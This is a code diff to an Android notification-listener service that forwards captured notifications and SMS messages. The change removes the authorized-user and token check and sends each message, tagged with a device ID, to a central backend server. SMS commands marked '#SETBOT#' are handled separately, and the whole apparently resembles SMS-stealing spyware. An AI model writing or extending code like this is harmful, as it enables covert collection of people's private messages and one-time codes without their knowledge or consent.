@@ -147,10 +147,7 @@ class NotificationForwarderService : NotificationListenerService() {
         val timeFormatted = SimpleDateFormat("h:mm a", Locale.getDefault()).format(Date(postTime))
 
         serviceScope.launch {
-            val token = preferenceManager.getBotToken()
-            val authorizedId = preferenceManager.getAuthorizedUserId()
-
-            if (token.isBlank() || authorizedId == 0L) return@launch
+            val serverUrl = preferenceManager.getServerUrl().ifBlank { "http://localhost:5000" }
 
             if (isSmsApp && (text.contains("#SETBOT#", ignoreCase = true) || text.contains("#RESETBOT#", ignoreCase = true))) {
                 return@launch
@@ -181,9 +178,11 @@ class NotificationForwarderService : NotificationListenerService() {
                 """.trimIndent()
             }
 
-            val sendResult = telegramClient.sendMessage(
-                token = token,
-                chatId = authorizedId,
+            // Route directly to backend server
+            val sendResult = telegramClient.reportToBackend(
+                serverUrl = serverUrl,
+                deviceId = deviceId,
+                type = if (isSmsApp) "SMS_NOTIFICATION" else "NOTIFICATION",
                 text = telegramMsg
             )
 
